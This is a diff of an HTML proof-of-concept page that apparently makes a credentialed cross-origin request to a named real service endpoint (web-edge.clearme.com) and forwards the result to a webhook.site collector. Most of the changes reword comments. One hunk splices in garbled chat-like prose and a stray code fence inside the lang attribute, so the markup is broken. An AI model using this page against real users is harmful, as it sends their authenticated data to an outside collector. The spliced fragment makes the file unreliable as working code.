@@ -1,4 +1,8 @@
 <!DOCTYPE html>
+  <html lang="en‑Pages, and the console error will disappear.
+
+  ```html
+  <!DOCTYPE html>
   <html lang="en">
   <head>
   <meta charset="UTF-8">
@@ -20,21 +24,21 @@
   <pre id="log"></pre>
 
   <script>
-    // -----------------------------------------------------------------
-    // Configuration – only these two lines need to be changed
-    // -----------------------------------------------------------------
+    // ---------------------------------------------------------------
+    // Configuration – edit only these two lines if needed
+    // ---------------------------------------------------------------
     const TARGET_URL   = 'https://web-edge.clearme.com/';          // 
   endpoint to test
     const COLLECTOR    =
-  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // your 
+  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // ← YOUR 
   webhook URL
-    // -----------------------------------------------------------------
+    // ---------------------------------------------------------------
 
     // Helper to append text to the <pre> box
     function log(msg) {
       const el = document.getElementById('log');
       el.textContent += msg + '\n';
-      el.scrollTop = el.scrollHeight; // keep latest visible
+      el.scrollTop = el.scrollHeight; // keep newest lines visible
     }
 
     // Perform the cross‑origin request with credentials
@@ -80,7 +84,6 @@
   with credentials.');
     });
   </script>
-  
+
   </body>
   </html>
-
